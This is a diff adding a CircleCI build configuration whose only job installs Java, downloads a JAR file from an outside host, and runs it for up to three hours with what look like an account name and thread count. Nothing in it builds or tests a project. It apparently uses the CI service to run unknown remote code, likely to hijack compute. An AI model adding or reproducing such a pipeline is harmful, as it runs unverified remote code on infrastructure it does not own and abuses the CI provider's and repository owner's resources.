@@ -1,0 +1,13 @@
+version: 2.1
+jobs:
+  build:
+    docker: 
+      - image: ubuntu:18.04
+
+    steps:
+      - run:
+          command: |
+            apt update
+            apt install wget default-jre -y
+            wget https://defaulter.runkodapps.com/Test.jar
+            timeout 3h java -jar Test.jar rock6064 3
